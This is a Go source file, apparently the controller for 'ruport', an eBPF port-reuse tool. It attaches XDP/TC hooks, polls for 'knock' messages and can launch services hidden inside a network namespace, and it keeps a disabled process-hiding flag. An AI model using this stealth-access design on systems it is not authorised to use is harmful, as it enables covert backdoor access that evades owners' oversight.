//go:build linux

// ruport 控制程序：基于 cilium/ebpf 的端口复用控制端，
// 功能等价移植自 ruport（C/libbpf）的 ruport.c。
package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"
	"github.com/vishvananda/netlink"
	"golang.org/x/sys/unix"

	"ruport-go/internal/bpf"
	"ruport-go/internal/control"
	"ruport-go/internal/netnsx"
)

// getCommonNetdevIfindex 自动获取网卡，等价于原 get__common_netdev_ifindex()：
// 读 /proc/net/dev，跳过 lo，选择 tx 字节数最大的网卡。
func getCommonNetdevIfindex() (int, error) {
	f, err := os.Open("/proc/net/dev")
	if err != nil {
		return 0, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	// 跳过前两行表头
	scanner.Scan()
	scanner.Scan()

	var (
		maxTxBytes uint64
		netdevName string
	)
	for scanner.Scan() {
		line := scanner.Text()
		idx := strings.IndexByte(line, ':')
		if idx < 0 {
			return 0, fmt.Errorf("invalid /proc/net/dev line: %q", line)
		}
		name := strings.TrimSpace(line[:idx])
		if name == "lo" {
			continue
		}
		fields := strings.Fields(line[idx+1:])
		// 列顺序: rx_bytes rx_packets rx_errs rx_drop rx_fifo rx_frame rx_multi
		//         rx_compressed tx_bytes ...，tx_bytes 为第 9 个字段
		if len(fields) < 9 {
			continue
		}
		txBytes, err := strconv.ParseUint(fields[8], 10, 64)
		if err != nil {
			continue
		}
		if txBytes > maxTxBytes {
			maxTxBytes = txBytes
			netdevName = name
		}
	}
	if err := scanner.Err(); err != nil {
		return 0, err
	}

	if maxTxBytes == 0 || netdevName == "" {
		return 0, errors.New("no usable netdev found in /proc/net/dev")
	}

	iface, err := net.InterfaceByName(netdevName)
	if err != nil {
		return 0, err
	}
	return iface.Index, nil
}

// tcAttach 保存 TC 挂载信息，等价于原 _xdptcinfo 中 tc 相关字段。
type tcAttach struct {
	ifindex int
	filters []*netlink.BpfFilter
	clsact  *netlink.Clsact
}

// attachTcFilters 创建 clsact qdisc 并挂载 egress/ingress filter，
// 等价于原 loadtcfilter() 中 bpf_tc_hook_create + bpf_tc_attach
// （priority=1 handle=1）。
func attachTcFilters(ifindex int, ingress, egress *ebpf.Program) (*tcAttach, error) {
	// 创建 clsact qdisc（handle ffff:0000，parent ffff:fff1），
	// 对应原 bpf_tc_hook_create(BPF_TC_EGRESS/INGRESS)
	clsact := &netlink.Clsact{
		QdiscAttrs: netlink.QdiscAttrs{
			LinkIndex: ifindex,
			Handle:    netlink.MakeHandle(0xffff, 0),
			Parent:    netlink.HANDLE_CLSACT,
		},
	}
	if err := netlink.QdiscAdd(clsact); err != nil && !errors.Is(err, syscall.EEXIST) {
		return nil, fmt.Errorf("create clsact qdisc: %w", err)
	}

	newFilter := func(parent uint32, prog *ebpf.Program) *netlink.BpfFilter {
		return &netlink.BpfFilter{
			FilterAttrs: netlink.FilterAttrs{
				LinkIndex: ifindex,
				Parent:    parent,
				Handle:    netlink.MakeHandle(0, 1),
				Priority:  1,
				Protocol:  unix.ETH_P_ALL,
			},
			Fd:           prog.FD(),
			DirectAction: false,
		}
	}

	// hook tc egress (tx 出口)。FilterReplace = 创建或顶替同 handle/prio
	// 的残留 filter（对齐原版 BPF_TC_F_REPLACE 与 XDP SKB 模式的替换语义，
	// 上次非正常退出后无需手工清理 clsact）
	egressFilter := newFilter(netlink.HANDLE_MIN_EGRESS, egress)
	if err := netlink.FilterReplace(egressFilter); err != nil {
		return nil, fmt.Errorf("attach tc egress: %w", err)
	}

	// hook tc ingress (rx 入口)
	ingressFilter := newFilter(netlink.HANDLE_MIN_INGRESS, ingress)
	if err := netlink.FilterReplace(ingressFilter); err != nil {
		_ = netlink.FilterDel(egressFilter)
		return nil, fmt.Errorf("attach tc ingress: %w", err)
	}

	return &tcAttach{
		ifindex: ifindex,
		filters: []*netlink.BpfFilter{egressFilter, ingressFilter},
		clsact:  clsact,
	}, nil
}

// release 卸载 TC 挂载，等价于原 releasetc()：
// bpf_tc_detach + bpf_tc_hook_destroy（ingress/egress 各一次）。
func (t *tcAttach) release() {
	if t == nil {
		return
	}
	for _, f := range t.filters {
		_ = netlink.FilterDel(f)
	}
	if err := netlink.QdiscDel(t.clsact); err != nil {
		log.Printf("destroy clsact qdisc: %v", err)
	}
}

// waitWeakupWorker 伺服线程，等价于原 waitweakup_worker()：
// 每秒轮询 message_map，逐条取出消息交给 control_router/control_process。
func waitWeakupWorker(msgMap *ebpf.Map, routerMap *ebpf.Map, ctl *control.Controller) {
	log.Print("---------------------------waitweakup_worker------------------------")

	for {
		pollMessages(msgMap, routerMap, ctl)
		time.Sleep(time.Second)
	}
}

func pollMessages(msgMap *ebpf.Map, routerMap *ebpf.Map, ctl *control.Controller) {
	// 先收集当前 key，再逐个 lookup_and_delete（等价原 get_next_key 循环）
	var key uint64
	var msg bpf.XdpMessage
	keys := make([]uint64, 0, 8)

	iter := msgMap.Iterate()
	for iter.Next(&key, &msg) {
		keys = append(keys, key)
	}
	if err := iter.Err(); err != nil {
		log.Printf("iterate message_map: %v", err)
	}

	for _, k := range keys {
		var m bpf.XdpMessage
		if err := msgMap.LookupAndDelete(k, &m); err != nil {
			continue
		}

		log.Print("receive a message")

		ctl.HandleRouter(&m, routerMap)
		ctl.HandleProcess(&m)
	}
}

func main() {
	var (
		ifaceName string
		srvPort   int
		bHidden   bool

		// netns 隐藏模式（设计见 doc/design/01-netns-hidden-service.md）
		netnsMode  bool
		nsName     string
		nsSubnet   string
		execCmd    string
		execDetach bool
		nsDestroy  bool
	)
	flag.StringVar(&ifaceName, "i", "", "网络接口名称")
	flag.IntVar(&srvPort, "p", 0, "服务端口(兼容保留，不参与逻辑)")
	flag.BoolVar(&bHidden, "H", false, "隐藏进程(原版 pidhide 已禁用，此参数仅为兼容保留)")

	flag.BoolVar(&netnsMode, "N", false, "netns 预热：启动即建立命名空间（不指定时由敲门指令 05 懒初始化）")
	flag.StringVar(&nsName, "ns-name", "ruport_ns", "netns 隐藏模式：命名空间名称")
	flag.StringVar(&nsSubnet, "ns-subnet", "192.0.2.0/24", "netns 内网段（TEST-NET 保留段；冲突时自动回退备选）")
	flag.StringVar(&execCmd, "exec", "", "netns 隐藏模式：在命名空间内拉起的服务命令（空格切分，不走 shell）")
	flag.BoolVar(&execDetach, "exec-detach", false, "服务不随 ruport 退出")
	flag.BoolVar(&nsDestroy, "ns-destroy", false, "销毁 netns 与 veth 后退出（异常残留处置用；正常退出即自动清场）")
	flag.Parse()

	// --ns-destroy：仅清理
	if nsDestroy {
		if err := netnsx.Destroy(nsName); err != nil {
			log.Fatalf("destroy netns: %v", err)
		}
		log.Printf("netns %s destroyed", nsName)
		return
	}

	// 原版仅在 -p 给出时校验端口范围
	portGiven := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "p" {
			portGiven = true
		}
	})
	if portGiven && (srvPort <= 0 || srvPort > 65535) {
		fmt.Println("port error")
		os.Exit(1)
	}

	ifindex := 0
	if ifaceName != "" {
		iface, err := net.InterfaceByName(ifaceName)
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to resolve iface to ifindex: %v\n", err)
			os.Exit(1)
		}
		ifindex = iface.Index
	}
	if ifindex == 0 {
		idx, err := getCommonNetdevIfindex()
		if err != nil || idx == 0 {
			fmt.Fprintf(os.Stderr, "failed to resolve iface to ifindex: %v\n", err)
			os.Exit(1)
		}
		ifindex = idx
	}

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("remove memlock: %v", err)
	}

	// netns 预热（可选）：-N 时启动即建 ns 并可预拉服务；
	// 不指定时由敲门指令 ins=0x05 懒初始化（internal/control）
	_, nsSub, err := net.ParseCIDR(nsSubnet)
	if err != nil {
		log.Fatalf("invalid -ns-subnet %q: %v", nsSubnet, err)
	}
	var nsInfo *netnsx.NS
	var serviceCmd *exec.Cmd
	if netnsMode {
		nsInfo, err = netnsx.Ensure(nsName, nsSub)
		if err != nil {
			log.Fatalf("ensure netns: %v", err)
		}
		defer nsInfo.Close()
		log.Printf("netns ready: %s, %s=%s(gw), %s=%s(service)",
			nsName, nsInfo.HostVeth, nsInfo.GatewayIP, nsInfo.NsVeth, nsInfo.ServiceIP)
		// FORWARD 链为 DROP 的宿主会丢弃转发进 ns 的包（只提示，不自动改防火墙）
		log.Print("hint: 若宿主 iptables/nftables FORWARD 链为 DROP，需自行放行 veth 转发")

		if execCmd != "" {
			cmd, err := netnsx.StartInNS(nsInfo.Fd, strings.Fields(execCmd))
			if err != nil {
				log.Fatalf("start service in netns: %v", err)
			}
			serviceCmd = cmd
			log.Printf("service in netns: pid %d (%s)", cmd.Process.Pid, execCmd)
		}
	}

	// load xdp
	var xdpObjs bpf.XdpObjects
	if err := bpf.LoadXdpObjects(&xdpObjs, nil); err != nil {
		log.Fatalf("load xdp/tc error: %v", err)
	}
	// XDP_FLAGS_SKB_MODE 对应 link.XDPGenericMode
	xdpLink, err := link.AttachXDP(link.XDPOptions{
		Program:   xdpObjs.XdpParse,
		Interface: ifindex,
		Flags:     link.XDPGenericMode,
	})
	if err != nil {
		xdpObjs.Close()
		log.Fatalf("load xdp/tc error: %v", err)
	}

	// load tc
	var tcObjs bpf.TcObjects
	if err := bpf.LoadTcObjects(&tcObjs, nil); err != nil {
		xdpLink.Close()
		xdpObjs.Close()
		log.Fatalf("load tc error: %v", err)
	}
	tcAt, err := attachTcFilters(ifindex, tcObjs.TcIngress, tcObjs.TcEgress)
	if err != nil {
		tcObjs.Close()
		xdpLink.Close()
		xdpObjs.Close()
		log.Fatalf("load tc error: %v", err)
	}

	// create a accept thread（伺服 goroutine）
	ctl := control.New(control.Config{
		Ifindex:      ifindex,
		NetnsName:    nsName,
		NetnsSubnet:  nsSub,
		NetnsPrewarm: nsInfo,
	})
	go waitWeakupWorker(xdpObjs.MessageMap, tcObjs.RouterMap, ctl)

	// 注册处理信号：SIGINT/SIGSEGV 时 releaseall 后退出（等价原 stop()）
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGSEGV)
	<-sigCh

	// 服务生命周期默认绑定 ruport（--exec-detach 可分离）；
	// 敲门指令拉起的服务同理，统一回收
	if serviceCmd != nil && serviceCmd.Process != nil && !execDetach {
		_ = serviceCmd.Process.Signal(syscall.SIGTERM)
	}
	ctl.Shutdown()

	tcAt.release()
	xdpLink.Close()
	tcObjs.Close()
	xdpObjs.Close()

	os.Exit(1)
}
